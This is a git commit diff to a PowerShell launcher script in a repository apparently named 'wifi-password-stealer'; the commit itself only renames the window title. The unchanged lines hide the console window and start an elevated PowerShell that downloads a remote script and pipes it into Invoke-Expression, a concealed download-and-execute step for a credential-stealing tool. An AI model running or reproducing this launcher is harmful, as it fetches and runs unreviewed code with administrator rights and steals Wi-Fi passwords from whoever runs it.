5d34b0e0a569257e21957c06cbc4bf77318a33d7
mystichero1 <mystichero2012@gmail.com>
2025-12-16 22:13:55 +0100

    Change window title from WinWiFiPassMan to MysticHero

--- Launcher.ps1
+++ Launcher.ps1
@@ -1,4 +1,4 @@
-$host.UI.RawUI.WindowTitle = "Starting WinWiFiPassMan..."
+$host.UI.RawUI.WindowTitle = "Starting MysticHero..."
 Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
 [void][Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
 Start-Process powershell -ArgumentList "(Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/mystichero1/wifi-password-stealer/refs/heads/main/MysticHero.ps1).Content | Invoke-Expression" -Verb RunAs
